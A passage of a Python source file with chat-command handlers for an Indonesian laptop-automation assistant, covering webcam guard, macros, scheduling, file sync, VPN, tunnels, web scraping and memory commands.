        """Mengaktifkan/menonaktifkan mode pengawasan kamera (Webcam Guard)."""
        from agent.guard import webcam_guard
        
        if not args:
            status = "AKTIF" if webcam_guard.is_running else "NONAKTIF"
            return f"🛡️ **Status Webcam Guard:** {status}\nGunakan `!guard on` untuk mengaktifkan atau `!guard off` untuk menonaktifkan."
            
        subcmd = args[0].lower().strip()
        if subcmd == "on":
            if webcam_guard.start():
                return "🛡️ **Webcam Guard diaktifkan!** Laptop Anda sekarang memantau gerakan di sekitarnya."
            else:
                return "❌ Gagal mengaktifkan Webcam Guard. Pastikan kamera tidak sedang digunakan aplikasi lain."
        elif subcmd == "off":
            webcam_guard.stop()
            return "🛡️ **Webcam Guard dinonaktifkan.**"
        else:
            return "❌ Argumen tidak valid. Gunakan `!guard on` atau `!guard off`."

    # ── PHASE 2: AI & Automation Intelligence ─────────────────────────────────

    async def handle_ai_work(self, args: list[str]) -> str:
        from agent.ai_work import ai_work
        if not args:
            return "Gunakan: !ai work <perintah alami>. Contoh: !ai work buatkan jadwal harian"
        return await ai_work(" ".join(args))

    async def handle_ai_write(self, args: list[str]) -> str:
        from agent.ai_work import ai_write
        if not args:
            return "Gunakan: !ai write <tipe> <topik>. Contoh: !ai write email follow up proposal"
        doc_type = args[0]
        topic = " ".join(args[1:]) if len(args) > 1 else doc_type
        return await ai_write(doc_type, topic)

    async def handle_ai_automate(self, args: list[str]) -> str:
        from agent.ai_work import ai_automate
        if not args:
            return "Gunakan: !ai automate <deskripsi>. Contoh: !ai automate backup folder Documents setiap jam"
        return await ai_automate(" ".join(args))

    async def handle_ai_summarize(self, args: list[str]) -> str:
        from agent.ai_work import ai_summarize
        if not args:
            return "Gunakan: !ai summarize <target>. Contoh: !ai summarize ~/Documents/Projects"
        return await ai_summarize(" ".join(args))

    async def handle_ai_research(self, args: list[str]) -> str:
        from agent.ai_work import ai_research
        if not args:
            return "Gunakan: !ai research <topik> [depth]. Contoh: !ai research AI 2026 medium"
        depth = "medium"
        topic = " ".join(args)
        if args[-1] in ("quick", "medium", "deep"):
            depth = args[-1]
            topic = " ".join(args[:-1])
        return await ai_research(topic, depth)

    async def handle_ai_insight(self, args: list[str]) -> str:
        from agent.ai_work import ai_insight
        period = "daily"
        if args and args[0] in ("daily", "weekly", "monthly"):
            period = args[0]
        return await ai_insight(period)

    async def handle_smart_clip(self, args: list[str]) -> str:
        from agent.smart_clipboard import smart_clip
        if not args:
            status = "AKTIF" if smart_clip.active else "NONAKTIF"
            return f"🧠 Smart Clipboard: {status}\nGunakan: !smart clipboard [on|off|history]"
        subcmd = args[0].lower()
        if subcmd in ("on", "start"):
            return smart_clip.start()
        elif subcmd in ("off", "stop"):
            return smart_clip.stop()
        elif subcmd in ("history", "hist"):
            return smart_clip.show_history()
        if subcmd == "clipboard" and len(args) > 1:
            subcmd2 = args[1].lower()
            if subcmd2 in ("on", "start"):
                return smart_clip.start()
            elif subcmd2 in ("off", "stop"):
                return smart_clip.stop()
            elif subcmd2 in ("history", "hist"):
                return smart_clip.show_history()
        return "Gunakan: !smart clipboard [on|off|history]"

    async def handle_macro(self, args: list[str]) -> str:
        from agent.macro import macro_manager
        if not args:
            return ("Gunakan:\n"
                    "  !macro record <nama>\n"
                    "  !macro stop\n"
                    "  !macro save <nama>\n"
                    "  !macro play <nama>\n"
                    "  !macro show <nama>\n"
                    "  !macro remove <nama> <index>\n"
                    "  !macro config onerror [abort|continue|retry]\n"
                    "  !macro list\n"
                    "  !macro delete <nama>")
        subcmd = args[0].lower()
        if subcmd == "record" and len(args) > 1:
            return macro_manager.record(args[1])
        elif subcmd == "stop":
            return macro_manager.stop()
        elif subcmd == "save" and len(args) > 1:
            return macro_manager.save(args[1])
        elif subcmd == "play" and len(args) > 1:
            return macro_manager.play(args[1])
        elif subcmd == "show" and len(args) > 1:
            return macro_manager.show(args[1])
        elif subcmd == "remove" and len(args) > 2 and args[2].isdigit():
            return macro_manager.remove_action(args[1], int(args[2]))
        elif subcmd == "config" and len(args) >= 3:
            return macro_manager.config(args[1], args[2])
        elif subcmd == "list":
            return macro_manager.list_macros()
        elif subcmd in ("del", "delete") and len(args) > 1:
            return macro_manager.delete(args[1])
        return ("Gunakan:\n"
                "  !macro record <nama>\n"
                "  !macro stop\n"
                "  !macro save <nama>\n"
                "  !macro play <nama>\n"
                "  !macro show <nama>\n"
                "  !macro remove <nama> <index>\n"
                "  !macro config onerror [abort|continue|retry]\n"
                "  !macro list\n"
                "  !macro delete <nama>")

    async def handle_schedule(self, args: list[str]) -> str:
        from agent.scheduler import scheduler
        if not args:
            return scheduler.list_schedules()
        subcmd = args[0].lower()
        if subcmd == "add" and len(args) >= 3:
            rest = args[1:]
            repeat = None
            if len(rest) >= 3 and rest[-2] == "repeat":
                repeat = rest[-1]
                rest = rest[:-2]
            time_str = rest[-1]
            command_end = -1
            if len(rest) >= 2 and rest[-2] == "in":
                time_str = rest[-2] + " " + rest[-1]
                command_end = -2
            elif len(rest) >= 3 and rest[-3] == "in":
                time_str = " ".join(rest[-3:])
                command_end = -3
            elif len(rest) >= 2 and rest[-2] == "every":
                time_str = " ".join(rest[-2:])
                command_end = -2
            command = " ".join(rest[:command_end]) if command_end != -1 else " ".join(rest[:-1])
            return scheduler.add(command, time_str, repeat=repeat)
        elif subcmd == "list":
            return scheduler.list_schedules()
        elif subcmd in ("del", "delete") and len(args) > 1 and args[1].isdigit():
            return scheduler.delete(int(args[1]))
        return "Gunakan: !schedule add <perintah> <waktu> [repeat <interval>]. Contoh: !schedule add !focus on 25 08:00 repeat daily"

    async def handle_voice_cmd(self, args: list[str]) -> str:
        from agent.voice_cmd import voice_cmd_manager
        if not args:
            status = "AKTIF" if voice_cmd_manager.active else "NONAKTIF"
            return f"🎤 Voice Command: {status}\nGunakan: !voice cmd [on|off]"
        subcmd = args[0].lower()
        if subcmd in ("on", "start"):
            return voice_cmd_manager.start()
        elif subcmd in ("off", "stop"):
            return voice_cmd_manager.stop()
        if subcmd == "cmd" and len(args) > 1:
            subcmd2 = args[1].lower()
            if subcmd2 in ("on", "start"):
                return voice_cmd_manager.start()
            elif subcmd2 in ("off", "stop"):
                return voice_cmd_manager.stop()
        return "Gunakan: !voice cmd [on|off]"

    # ── PHASE 3: File, Sync & Data Management ────────────────────────────────

    async def handle_sync(self, args: list[str]) -> str:
        from agent.file_sync import sync_manager
        if not args:
            return "Gunakan: !sync <folder> [service]. Contoh: !sync ~/Documents gdrive"
        folder = args[0]
        service = args[1] if len(args) > 1 else "local"
        return sync_manager.sync_folder(folder, service)

    async def handle_quick(self, args: list[str]) -> str:
        if not args:
            return "Gunakan: !quick [upload|app] [args]"
        subcmd = args[0].lower()
        if subcmd in ("upload", "unggah"):
            return await self.handle_quick_upload(args[1:])
        elif subcmd in ("app", "aplikasi", "buka"):
            return await self.handle_quick_app(args[1:])
        return "Gunakan: !quick [upload|app] [args]. Contoh: !quick upload atau !quick app vscode"

    async def handle_quick_upload(self, args: list[str]) -> str:
        from agent.file_ops import quick_upload
        return quick_upload()

    async def handle_recent(self, args: list[str]) -> str:
        from agent.file_ops import recent_files
        item_type = "files"
        count = 10
        if args:
            if args[0] in ("files", "folders"):
                item_type = args[0]
                count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 10
            elif args[0].isdigit():
                count = int(args[0])
        return recent_files(item_type, count)

    async def handle_search_content(self, args: list[str]) -> str:
        from agent.file_ops import search_content
        if not args:
            return "Gunakan: !search content <keyword> [folder]. Contoh: !search content budget ~/Documents"
        start = 0
        if args[0] == "content":
            start = 1
        remaining = args[start:]
        if not remaining:
            return "Gunakan: !search content <keyword> [folder]. Contoh: !search content budget ~/Documents"
        keyword = remaining[0]
        folder = remaining[1] if len(remaining) > 1 else None
        return search_content(keyword, folder)

    async def handle_convert(self, args: list[str]) -> str:
        from agent.file_ops import convert_file
        if len(args) < 2:
            return "Gunakan: !convert <file> <format>. Contoh: !convert laporan.docx pdf"
        return convert_file(args[0], args[1])

    async def handle_backup(self, args: list[str]) -> str:
        from agent.file_sync import SyncManager
        from agent.file_ops import organize_folder
        if not args:
            return "Gunakan: !backup <folder> [quick|full]. Contoh: !backup ~/Documents full"
        folder = args[0]
        mode = args[1] if len(args) > 1 and args[1] in ("quick", "full") else "quick"
        sm = SyncManager()
        result = sm.sync_folder(folder, "local")
        if mode == "full":
            result += f"\n{organize_folder(folder, 'type')}"
        return result

    async def handle_organize(self, args: list[str]) -> str:
        from agent.file_ops import organize_folder
        if not args:
            return "Gunakan: !organize <folder> [by type|date]. Contoh: !organize ~/Downloads by type"
        folder = args[0]
        method = "type"
        if len(args) > 1:
            if args[1] in ("type", "date"):
                method = args[1]
            elif args[1] == "by" and len(args) > 2:
                method = "date" if "date" in args[2].lower() else "type"
        return organize_folder(folder, method)

    async def handle_file_watcher(self, args: list[str]) -> str:
        from agent.file_watcher import file_watcher
        if not args:
            return file_watcher.get_changes()
        start = 0
        if args[0] == "watcher":
            start = 1
        remaining = args[start:]
        if not remaining:
            return file_watcher.get_changes()
        subcmd = remaining[0].lower()
        if subcmd in ("on", "start") and len(remaining) > 1:
            return file_watcher.start(remaining[1])
        elif subcmd in ("off", "stop") and len(remaining) > 1:
            return file_watcher.stop(remaining[1])
        elif subcmd in ("status", "changes"):
            folder = remaining[1] if len(remaining) > 1 else None
            return file_watcher.get_changes(folder)
        return "Gunakan: !file watcher [on|off|status] <folder>"

    async def handle_version(self, args: list[str]) -> str:
        from agent.file_version import file_version_manager
        if not args:
            return "Gunakan: !version [status|commit|history|revert] [file]"
        subcmd = args[0].lower()
        if subcmd == "commit" and len(args) > 1:
            return file_version_manager.commit(args[1])
        elif subcmd == "history" and len(args) > 1:
            return file_version_manager.history(args[1])
        elif subcmd == "revert" and len(args) > 1:
            ver = int(args[2]) if len(args) > 2 and args[2].isdigit() else None
            return file_version_manager.revert(args[1], ver)
        elif subcmd == "status":
            filepath = args[1] if len(args) > 1 else None
            return file_version_manager.status(filepath)
        return "Gunakan: !version [commit|history|revert|status] <file> [versi]"

    async def handle_clean(self, args: list[str]) -> str:
        from agent.file_ops import clean_disk
        scope = args[0] if args and args[0] in ("temp", "cache", "duplicates", "all") else "all"
        return clean_disk(scope)

    # ── PHASE 4: System Enhancement & Convenience ────────────────────────────

    async def handle_volume_app(self, args: list[str]) -> str:
        if not args:
            return "Gunakan: !volume [app|global] [level|up|down|mute]. Contoh: !volume chrome 60"
        cmd = args[0].lower()
        if cmd in ("up", "naik"):
            return await self.handle_audio_control("volume", "up")
        if cmd in ("down", "turun"):
            return await self.handle_audio_control("volume", "down")
        if cmd in ("mute", "senyap"):
            return await self.handle_audio_control("mute", None)
        if cmd == "global" or len(args) < 2:
            level = args[1] if len(args) > 1 else "50"
            return await self.handle_audio_control("volume", level)
        app = cmd
        level = args[1] if len(args) > 1 else "50"
        if app == "chrome" or app == "chromium":
            try:
                import pulsectl
                with pulsectl.Pulse("rav-volume") as pulse:
                    for sink_input in pulse.sink_input_list():
                        if "chrome" in sink_input.proplist.get("application.process.binary", "").lower():
                            vol = min(1.0, max(0.0, int(level) / 100.0))
                            pulse.volume_set_all_chans(sink_input, vol)
                            return f"🔊 Volume Chrome diatur ke {level}%"
                return "Tidak ada audio Chrome yang sedang diputar."
            except ImportError:
                return "Fitur per-app volume membutuhkan pulsectl. Install: pip install pulsectl"
        elif app in ("spotify", "firefox", "vlc", "brave", "discord"):
            try:
                import pulsectl
                with pulsectl.Pulse("rav-volume") as pulse:
                    for sink_input in pulse.sink_input_list():
                        binary = sink_input.proplist.get("application.process.binary", "").lower()
                        if app in binary:
                            vol = min(1.0, max(0.0, int(level) / 100.0))
                            pulse.volume_set_all_chans(sink_input, vol)
                            return f"🔊 Volume {app.capitalize()} diatur ke {level}%"
                    return f"Tidak ada audio {app.capitalize()} yang sedang diputar."
            except ImportError:
                return "Fitur per-app volume membutuhkan pulsectl."
        return f"App '{app}' belum didukung untuk volume terpisah. Gunakan: !volume global {level}"

    async def handle_power(self, args: list[str]) -> str:
        from agent.power_manager import set_power_profile
        profile = args[0] if args else "balanced"
        return set_power_profile(profile)

    async def handle_multi_monitor(self, args: list[str]) -> str:
        from agent.multi_monitor import list_monitors, switch_monitor
        if not args:
            return list_monitors()
        subcmd = args[0].lower()
        if subcmd == "monitor" and len(args) > 1:
            subcmd = args[1].lower()
            args = args[1:]
        if subcmd == "list":
            return list_monitors()
        elif subcmd == "switch":
            target = args[1] if len(args) > 1 else "auto"
            return switch_monitor(target)
        elif subcmd in ("arrange", "layout"):
            return "Fitur arrange monitor belum diimplementasi."
        return "Gunakan: !multi monitor [list|switch|arrange] [args]"

    async def handle_sleep(self, args: list[str]) -> str:
        from agent.sleep_wake import sleep_laptop
        delay = args[0] if args else None
        return sleep_laptop(delay)

    async def handle_wake(self, args: list[str]) -> str:
        from agent.sleep_wake import wake_laptop
        if not args:
            return "Gunakan: !wake <waktu>. Contoh: !wake 07:30"
        return wake_laptop(args[0])

    async def handle_quick_app(self, args: list[str]) -> str:
        from agent.command_handler import CommandHandler
        if not args:
            return "Gunakan: !quick app <nama>. Contoh: !quick app notion atau !quick app vscode"
        app_name = args[0]
        return await self.handle_launch_app(app_name)

    async def handle_night_mode(self, args: list[str]) -> str:
        from agent.night_mode import night_mode_on, night_mode_off
        if not args:
            return "Gunakan: !night mode [on|off]"
        subcmd = args[0].lower()
        if subcmd == "mode" and len(args) > 1:
            subcmd = args[1].lower()
        if subcmd in ("on", "start", "1"):
            return night_mode_on()
        elif subcmd in ("off", "stop", "0"):
            return night_mode_off()
        return "Gunakan: !night mode [on|off]"

    async def handle_window_arrange(self, args: list[str]) -> str:
        from agent.window_manager import arrange_windows, snap_window, minimize_all, close_all
        if not args:
            return "Gunakan: !window [arrange|snap|minimize all|close all] [args]"
        subcmd = args[0].lower()
        if subcmd == "arrange":
            layout = args[1] if len(args) > 1 else "cascade"
            return arrange_windows(layout)
        elif subcmd == "snap":
            pos = args[1] if len(args) > 1 else "left"
            return snap_window(pos)
        elif subcmd in ("minimize", "minimizeall", "minimize all") or (subcmd == "all" and len(args) > 1 and args[1] == "minimize"):
            return minimize_all()
        elif subcmd in ("close", "closeall", "close all") or (subcmd == "all" and len(args) > 1 and args[1] == "close"):
            return close_all()
        return "Gunakan: !window [arrange|snap|minimize all|close all] [args]"

    async def handle_hotkey(self, args: list[str]) -> str:
        from agent.hotkey_manager import hotkey_manager
        if not args:
            return hotkey_manager.list_hotkeys()
        subcmd = args[0].lower()
        if subcmd == "create" and len(args) >= 3:
            return hotkey_manager.create(args[1], " ".join(args[2:]))
        elif subcmd == "list":
            return hotkey_manager.list_hotkeys()
        elif subcmd in ("del", "delete") and len(args) > 1:
            return hotkey_manager.delete(args[1])
        return "Gunakan: !hotkey [create|list|delete] [nama] [key]"

    async def handle_launch_advanced(self, args: list[str]) -> str:
        import subprocess
        import shutil
        if not args:
            return "Gunakan: !launch advanced <app> [args]. Contoh: !launch advanced chrome --incognito"
        app = args[0]
        app_args = args[1:]
        app_map = {
            "chrome": ["google-chrome", "chrome", "chromium-browser"],
            "firefox": ["firefox"],
            "vscode": ["code"], "code": ["code"],
        }
        commands = app_map.get(app.lower(), [app])
        cmd = None
        for c in commands:
            if shutil.which(c):
                cmd = c
                break
        if not cmd:
            return f"❌ Aplikasi '{app}' tidak ditemukan."
        try:
            full_cmd = [cmd] + app_args
            subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            args_str = " ".join(app_args) if app_args else "(no args)"
            return f"🚀 {app} diluncurkan dengan: {args_str}"
        except Exception as e:
            return f"❌ Gagal: {e}"

    # ── PHASE 1: Core Productivity Features ──────────────────────────────────

    async def handle_focus(self, args: list[str]) -> str:
        """Focus mode — Pomodoro timer + block distractions."""
        from agent.focus import focus_manager
        from agent.time_utils import parse_duration
        if not args:
            return focus_manager.get_remaining()
        subcmd = args[0].lower()
        if subcmd == "on":
            if len(args) > 1:
                seconds = parse_duration(args[1])
                minutes = max(1, seconds // 60)
            else:
                minutes = 25
            return focus_manager.start(minutes)
        elif subcmd == "off":
            return focus_manager.stop()
        return "Gunakan: !focus on [waktu] — contoh: !focus on, !focus on 30m, !focus on 2h, !focus on 45s"

    async def handle_workspace(self, args: list[str]) -> str:
        """Workspace manager — save/load desktop state."""
        from agent.workspace import workspace_manager
        if not args:
            return "Gunakan: !workspace [save|load|list|delete] <nama>"
        subcmd = args[0].lower()
        ws_name = " ".join(args[1:]) if len(args) > 1 else "default"
        if subcmd == "save":
            return workspace_manager.save(ws_name)
        elif subcmd == "load":
            return workspace_manager.load(ws_name)
        elif subcmd == "list":
            return workspace_manager.list_workspaces()
        elif subcmd in ("del", "delete"):
            return workspace_manager.delete(ws_name)
        return "Subperintah tidak dikenal. Gunakan: save, load, list, delete"

    async def handle_quicknote(self, args: list[str]) -> str:
        """Quick markdown note."""
        from agent.quicknote import create_note, list_notes
        if not args:
            return list_notes()
        title = args[0]
        content = " ".join(args[1:]) if len(args) > 1 else ""
        return create_note(title, content)

    async def handle_browser(self, args: list[str]) -> str:
        """Browser control."""
        from agent.browser_controller import browser_new, browser_search, browser_scroll, browser_refresh, browser_close
        if not args:
            return "Gunakan: !browser [new|search|scroll|refresh|close] [args]"
        subcmd = args[0].lower()
        if subcmd == "new" and len(args) > 1:
            if macro_manager.recording:
                macro_manager.add_action({"action": "open_url", "url": " ".join(args[1:])})
            return browser_new(" ".join(args[1:]))
        elif subcmd == "search" and len(args) > 1:
            query = " ".join(args[1:])
            if macro_manager.recording:
                url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
                macro_manager.add_action({"action": "open_url", "url": url})
            return browser_search(query)
        elif subcmd == "scroll":
            direction = args[1] if len(args) > 1 and args[1] in ("up", "down") else "down"
            if macro_manager.recording:
                macro_manager.add_action({"action": "key", "key": f"page{direction}"})
            return browser_scroll(direction)
        elif subcmd == "refresh":
            if macro_manager.recording:
                macro_manager.add_action({"action": "key", "key": "f5"})
            return browser_refresh()
        elif subcmd == "close":
            tab = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
            if macro_manager.recording:
                macro_manager.add_action({"action": "key", "key": f"browser_close_tab_{tab}" if tab else "browser_close_active"})
            return browser_close(tab)
        return "Subperintah tidak dikenal."

    async def handle_daily(self, args: list[str]) -> str:
        """Daily activity report with AI analysis."""
        from agent.daily_report import generate_daily_report
        from ai_module.fast_ai import fast_ai
        period = "today"
        if args and args[0].lower() == "yesterday":
            period = "yesterday"
        raw_data = generate_daily_report(period)
        if fast_ai.enabled:
            try:
                insight = await fast_ai.summarize(
                    f"Data sistem laptop:\n{raw_data}",
                    query="Analisis kesehatan sistem dan beri saran optimasi dalam bahasa Indonesia natural"
                )
                if insight:
                    return f"{raw_data}\n\n🧠 Analisis:\n{insight}"
            except Exception:
                pass
        return raw_data

    async def handle_reminder(self, args: list[str]) -> str:
        """Reminder system."""
        from agent.reminder import reminder_manager
        if not args:
            return reminder_manager.list_reminders()
        subcmd = args[0].lower()
        if subcmd == "add" and len(args) >= 3:
            return reminder_manager.add(" ".join(args[1:-1]), args[-1])
        elif subcmd == "list":
            return reminder_manager.list_reminders()
        elif subcmd in ("del", "delete") and len(args) > 1 and args[1].isdigit():
            return reminder_manager.delete(int(args[1]))
        elif subcmd == "add":
            return "Gunakan: !reminder add <teks> <waktu>. Contoh: !reminder add meeting 30m"
        return "Gunakan: !reminder [add|list|delete] [args]"

    async def handle_task(self, args: list[str]) -> str:
        """Task sync with external services."""
        from agent.task_sync import task_manager
        if not args:
            return task_manager.list_tasks()
        subcmd = args[0].lower()
        if subcmd in ("sync", "add") and len(args) >= 2:
            text = " ".join(args[1:])
            deadline = None
            if " | " in text:
                parts = text.split(" | ", 1)
                text = parts[0]
                deadline = parts[1]
            return task_manager.add(text, deadline)
        elif subcmd == "list":
            return task_manager.list_tasks()
        elif subcmd == "done" and len(args) > 1 and args[1].isdigit():
            return task_manager.done(int(args[1]))
        elif subcmd in ("del", "delete") and len(args) > 1 and args[1].isdigit():
            return task_manager.delete(int(args[1]))
        return "Gunakan: !task [add|list|done|delete] [args]"

    async def handle_meeting(self, args: list[str]) -> str:
        """Meeting mode — prepare for online meetings."""
        from agent.meeting_mode import prepare_meeting
        if not args:
            return "Gunakan: !meeting mode [on|off] [nama meeting]"
        subcmd = args[0].lower()
        if subcmd == "mode" and len(args) > 1 and args[1].lower() == "on":
            meeting_name = " ".join(args[2:]) if len(args) > 2 else "Meeting"
            return prepare_meeting(meeting_name)
        elif subcmd == "mode" and len(args) > 1 and args[1].lower() == "off":
            from agent.focus import focus_manager
            return focus_manager.stop()
        return "Gunakan: !meeting mode [on|off] [nama]"

    async def handle_custom(self, args: list[str]) -> str:
        """Custom command aliases."""
        from agent.custom_aliases import alias_manager
        if not args:
            return alias_manager.list_aliases()
        subcmd = args[0].lower()
        if subcmd == "alias" and len(args) >= 3:
            return alias_manager.set(args[1], " ".join(args[2:]))
        elif subcmd == "list":
            return alias_manager.list_aliases()
        elif subcmd in ("del", "delete") and len(args) > 1:
            return alias_manager.delete(args[1])
        return "Gunakan: !custom alias <nama> <perintah> atau !custom list"

    # ── PHASE 5: Advanced & Pro Features ──────────────────────────────

    async def handle_multi(self, args: list[str]) -> str:
        if not args:
            return "Gunakan: !multi [monitor|device] [args]"
        subcmd = args[0].lower()
        if subcmd in ("monitor", "display"):
            return await self.handle_multi_monitor(args[1:])
        elif subcmd in ("device", "devices", "perangkat"):
            return await self.handle_multi_device(args[1:])
        return "Gunakan: !multi [monitor|device] [args]"

    async def handle_time_track(self, args: list[str]) -> str:
        from agent.time_track import start_track, stop_track, status_track, report_track
        if not args:
            return "Gunakan: !time track [start|stop|status|report] [project]"
        subcmd = args[0].lower()
        if subcmd == "track" and len(args) > 1:
            subcmd = args[1].lower()
            args = args[1:]
        if subcmd in ("start", "mulai"):
            project = " ".join(args[1:]) if len(args) > 1 else "General"
            return start_track(project)
        elif subcmd == "stop" or subcmd == "selesai":
            return stop_track()
        elif subcmd == "status":
            return status_track()
        elif subcmd in ("report", "laporan"):
            from agent.time_utils import parse_duration
            if len(args) > 1:
                seconds = parse_duration(args[1], default_unit="d")
                days = max(1, seconds // 86400)
            else:
                days = 7
            return report_track(days)
        return "Gunakan: !time track [start|stop|status|report] [project]"

    async def handle_session(self, args: list[str]) -> str:
        from agent.session_handoff import save_session, list_sessions, restore_session, delete_session
        if not args:
            return "Gunakan: !session [save|list|restore|delete] <name>"
        subcmd = args[0].lower()
        if subcmd in ("save", "simpan") and len(args) > 1:
            return save_session(args[1])
        elif subcmd in ("list", "daftar"):
            return list_sessions()
        elif subcmd in ("restore", "pulihkan") and len(args) > 1:
            return restore_session(args[1])
        elif subcmd in ("del", "delete", "hapus") and len(args) > 1:
            return delete_session(args[1])
        return "Gunakan: !session [save|list|restore|delete] <name>"

    async def handle_share_screen(self, args: list[str]) -> str:
        from agent.share_screen import take_screenshot
        fullscreen = True
        if args:
            a0 = args[0].lower()
            if a0 == "screen" and len(args) > 1:
                a0 = args[1].lower()
            if a0 in ("area", "select", "region"):
                fullscreen = False
        return take_screenshot(fullscreen)

    async def handle_multi_device(self, args: list[str]) -> str:
        from agent.multi_device import register_device, list_devices, remove_device, send_command
        if not args:
            return list_devices()
        subcmd = args[0].lower()
        if subcmd in ("register", "daftar") and len(args) >= 2:
            ip = args[2] if len(args) > 2 else None
            return register_device(args[1], ip)
        elif subcmd in ("list", "daftar"):
            return list_devices()
        elif subcmd in ("del", "delete", "hapus") and len(args) > 1:
            return remove_device(args[1])
        elif subcmd in ("send", "kirim") and len(args) >= 3:
            return send_command(args[1], " ".join(args[2:]))
        return "Gunakan: !multi device [register|list|delete|send] [args]"

    async def handle_profile(self, args: list[str]) -> str:
        from agent.profile import create_profile, list_profiles, apply_profile, delete_profile
        if not args:
            return list_profiles()
        subcmd = args[0].lower()
        if subcmd in ("create", "buat") and len(args) >= 2:
            apps = args[2:] if len(args) > 2 else []
            return create_profile(args[1], apps)
        elif subcmd in ("list", "daftar"):
            return list_profiles()
        elif subcmd in ("apply", "pakai") and len(args) > 1:
            return apply_profile(args[1])
        elif subcmd in ("del", "delete", "hapus") and len(args) > 1:
            return delete_profile(args[1])
        return "Gunakan: !profile [create|list|apply|delete] [name] [apps]"

    async def handle_dash(self, args: list[str]) -> str:
        from agent.dash import get_dashboard
        return get_dashboard()

    async def handle_activity_log(self, args: list[str]) -> str:
        from agent.activity_log import view_log
        from agent.time_utils import parse_duration
        days = 1
        action_filter = None
        limit = 20
        if args:
            if args[0] == "log" and len(args) > 1:
                args = args[1:]
            if args:
                if args[0].startswith("--filter="):
                    action_filter = args[0].split("=", 1)[1]
                else:
                    try:
                        seconds = parse_duration(args[0], default_unit="d")
                        days = max(1, seconds // 86400)
                    except ValueError:
                        pass
                if len(args) > 1:
                    try:
                        seconds = parse_duration(args[-1], default_unit="d")
                        limit = max(1, seconds // 86400)
                    except ValueError:
                        pass
        return view_log(days, action_filter, limit)

    async def handle_vpn(self, args: list[str]) -> str:
        from agent.vpn_manager import vpn_status, vpn_connect, vpn_disconnect
        if not args:
            return vpn_status()
        subcmd = args[0].lower()
        if subcmd in ("status", "cek"):
            return vpn_status()
        elif subcmd in ("connect", "on", "hubung") and len(args) > 1:
            return vpn_connect(args[1])
        elif subcmd in ("disconnect", "off", "putus"):
            name = args[1] if len(args) > 1 else None
            return vpn_disconnect(name)
        return "Gunakan: !vpn [status|connect|disconnect] [name]"

    async def handle_tunnel(self, args: list[str]) -> str:
        from agent.tunnel_manager import create_tunnel, list_tunnels, start_tunnel, delete_tunnel
        if not args:
            return list_tunnels()
        subcmd = args[0].lower()
        if subcmd in ("create", "buat") and len(args) >= 3:
            port = int(args[3]) if len(args) > 3 else None
            return create_tunnel(args[1], args[2], port)
        elif subcmd in ("list", "daftar"):
            return list_tunnels()
        elif subcmd in ("start", "mulai") and len(args) > 1:
            return start_tunnel(args[1])
        elif subcmd in ("del", "delete", "hapus") and len(args) > 1:
            return delete_tunnel(args[1])
        return "Gunakan: !tunnel [create|list|start|delete] [args]"

    async def handle_scrape(self, args: list[str]) -> str:
        from agent.scraper import scrape_url, smart_search, read_rss, add_scheduled_job, remove_scheduled_job, list_scheduled_jobs
        if not args:
            return ("Gunakan:\n"
                    "  !scrape <url>                      — Ambil konten dari URL\n"
                    "  !scrape search <query>             — Cari web + ambil konten hasil\n"
                    "  !scrape rss <feed_url>             — Baca RSS feed\n"
                    "  !scrape schedule <search|rss> <target> <interval_jam> — Jadwalkan scraping rutin\n"
                    "  !scrape schedule list              — Lihat jadwal scraping\n"
                    "  !scrape schedule remove <id>       — Hapus jadwal scraping")
        subcmd = args[0].lower()

        if subcmd == "search":
            query = " ".join(args[1:])
            if not query:
                return "❌ Masukkan query pencarian."
            return await smart_search(query, max_results=3)

        elif subcmd in ("rss", "feed"):
            feed_url = args[1] if len(args) > 1 else ""
            if not feed_url.startswith("http"):
                return "❌ Masukkan URL RSS feed yang valid."
            return await read_rss(feed_url, limit=10)

        elif subcmd == "schedule":
            if len(args) > 1 and args[1] == "list":
                jobs = list_scheduled_jobs()
                if not jobs:
                    return "Belum ada jadwal scraping."
                lines = ["📅 Jadwal Scraping:"]
                for j in jobs:
                    tgt = j.get("query") or j.get("url", "")
                    lines.append(f"  • {j['id']}: {j['type']} `{tgt}` (every {j.get('interval', 21600)//3600}h)")
                return "\n".join(lines)
            if len(args) > 1 and args[1] == "remove":
                if len(args) < 3:
                    return "❌ Gunakan: !scrape schedule remove <id>"
                if remove_scheduled_job(args[2]):
                    return f"Jadwal `{args[2]}` dihapus."
                return f"Jadwal `{args[2]}` tidak ditemukan."
            if len(args) >= 4:
                sched_type = args[1]
                target = args[2]
                from agent.time_utils import parse_duration, format_duration
                try:
                    interval = parse_duration(args[3], default_unit="h")
                except ValueError as e:
                    return f"❌ {e}"
                job_id = f"{sched_type}_{int(time.time())}"
                add_scheduled_job(job_id, sched_type, target, interval)
                return f"✅ Jadwal scraping '{job_id}' dibuat: {sched_type} `{target}` setiap {format_duration(interval)}."
            return "❌ Format: !scrape schedule <search|rss> <target> <interval_jam>"

        else:
            url = args[0]
            if url.startswith("http"):
                result = await scrape_url(url, use_ai=True)
                display = result.get("ai_summary") or result.get("content", "")
                lines = [
                    f"📄 {result.get('title', url)}",
                    f"   {url}",
                    "",
                    display[:3000],
                ]
                return "\n".join(lines)
            else:
                query = " ".join(args)
                return await smart_search(query, max_results=3, use_ai=True)
            if "error" in result:
                return result["error"]
            display = result.get("ai_summary") or result.get("content", "")
            lines = [
                f"📄 **{result['title']}**",
                f"   _{result['url']}_",
                f"   📝 {result.get('word_count', 0)} kata | {'💾 CACHED' if result.get('cached') else '🆕 Fresh'}",
                "",
                display[:3000],
            ]
            return "\n".join(lines)

    async def handle_memory(self, args: list[str]) -> str:
        from agent.memory.manager import memory_manager
        if not args:
            return (
                "📝 *Memory System*\n"
                "`!memory search <query>` — Cari memory\n"
                "`!memory summarize [topic]` — Ringkasan semua memory\n"
                "`!memory forget <query>` — Hapus memory terkait\n"
                "`!memory stats` — Statistik memory\n"
                "`!memory sync` — Sinkron antar device"
            )
        sub = args[0].lower()
        if sub == "search":
            query = " ".join(args[1:])
            if not query:
                return "❌ Masukkan query pencarian."
            results = memory_manager.search(query)
            if not results:
                return "🔍 Tidak ada hasil yang relevan."
            lines = ["🔍 *Memory Search Results:*"]
            for r in results[:5]:
                score = f"{(1 - r['distance']) * 100:.0f}%" if r.get("distance") else "N/A"
                lines.append(f"📌 `[{score}]` {r['text'][:200]}")
            return "\n".join(lines)
        elif sub == "summarize":
            topic = " ".join(args[1:]) or None
            return memory_manager.summarize_all(topic)
        elif sub == "forget":
